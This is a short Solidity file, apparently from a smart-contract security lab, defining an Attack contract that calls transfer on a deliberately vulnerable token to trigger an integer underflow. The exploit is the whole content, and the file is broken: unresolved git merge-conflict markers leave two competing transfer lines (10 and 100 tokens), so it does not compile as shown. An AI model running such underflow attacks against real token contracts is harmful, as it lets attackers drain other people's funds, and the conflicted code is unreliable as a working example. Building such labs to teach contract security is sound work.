// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./VulnerableToken.sol";

contract Attack {
    VulnerableToken public vulnerableToken;

    constructor(address _vulnerableTokenAddress) {
        vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
    }

    // Perform underflow attack
    function exploitUnderflow() public {
<<<<<<<< HEAD:overflow_lab/contracts/Attack.sol
        vulnerableToken.transfer(msg.sender, 10); // ⚡ Try sending 10 token
========
        vulnerableToken.transfer(msg.sender, 100);
>>>>>>>> underflow-branch:underflow_lab/contracts/Attack.sol
    }
}
